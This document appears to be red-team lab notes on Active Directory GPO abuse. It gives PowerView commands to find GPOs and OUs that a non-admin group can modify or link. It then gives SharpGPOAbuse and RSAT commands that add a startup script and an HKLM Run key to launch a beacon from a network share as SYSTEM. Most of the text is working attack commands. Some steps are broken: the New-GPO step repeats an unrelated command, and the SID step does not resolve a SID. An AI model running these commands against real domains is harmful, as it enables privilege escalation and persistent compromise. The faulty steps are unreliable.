# Modifying an Existing GPO

Modifying an existing GPO that is already applied to one or more OUs is the most straightforward scenario.  To search for these, we need to enumerate all GPOs in the domain with Get-DomainGPO and check the ACL of each one with Get-DomainObjectAcl.  We want to filter any for which a principal has modify privileges such as CreateChild, WriteProperty or GenericWrite, and also want to filter out the legitimate principals including SYSTEM, Domain Admins and Enterprise Admins.

    powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

Resolve SID of the principle:

    powershell Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath

This shows us that members of the "Developers" group can modify "Vulnerable GPO".
We also want to know which OU(s) this GPO applies to, and by extension which computers are in those OUs.  GPOs are linked to an OU by modifying the gPLink property of the OU itself.  The Get-DomainOU cmdlet has a handy -GPLink parameter which takes a GPO GUID.

    powershell Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName

Finally, to get the computers in an OU, we can use Get-DomainComputer and use the OU's distinguished name as a search base.

    powershell Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

To modify a GPO without the use of GPMC (Group Policy Management Console), we can modify the associated files directly in SYSVOL (the gpcFileSysPath).

    ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}

We can do that manually or use an automated tool such as SharpGPOAbuse, which has several abuses built into it. Here's an example using a Computer Startup Script.  It will put a startup script in SYSVOL that will be executed each time an effected computer starts (which incidentally also acts as a good persistence mechanism).

    execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"

Note that you can find this software share using PowerView:

    powershell Find-DomainShare -CheckShareAccess

Log into the console of Workstation 1 and run gpupdate /force from a Command Prompt.  Then reboot the machine.  After it starts up, the DNS Beacon will execute as SYSTEM.

# Create and Link a GPO

Group Policy Objects are stored in CN=Policies,CN=System - principals that can create new GPOs in the domain have the "Create groupPolicyContainer objects" privilege over this object.  We can find these with PowerView's Get-DomainObjectAcl cmdlet by looking for those that have "CreateChild" rights on the "Group-Policy-Container", and then resolving their SIDs to readable names.

    powershell Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }

This shows that members of the "Developers" group can create new GPOs. Being able to create a GPO doesn't achieve anything unless it can be linked to an OU.  The ability to link a GPO to an OU is controlled on the OU itself by granting "Write gPLink" privileges.

This is also something we can find with PowerView by first getting all of the domain OUs and piping them into Get-DomainObjectAcl again.  Iterate over each one looking for instances of "WriteProperty" over "GP-Link" .

    powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl

This shows that members of the "Developers" group can link GPOs to the "Workstations" OU.

GPOs can be managed from the command line via the PowerShell RSAT modules.  These are an optional install and so usually only found on management workstations.  The Get-Module cmdlet will show if they are present.
    
    powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands

Use the New-GPO cmdlet to create and link a new GPO.

    powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands

Some abuses can be implemented directly using RSAT.  For example, the Set-GPPrefRegistryValue cmdlet can be used to add an HKLM autorun key to the registry.

    powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString

Next, apply the GPO to the target OU. Remember that HKLM autoruns require a reboot to execute.

    powershell Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"



























  
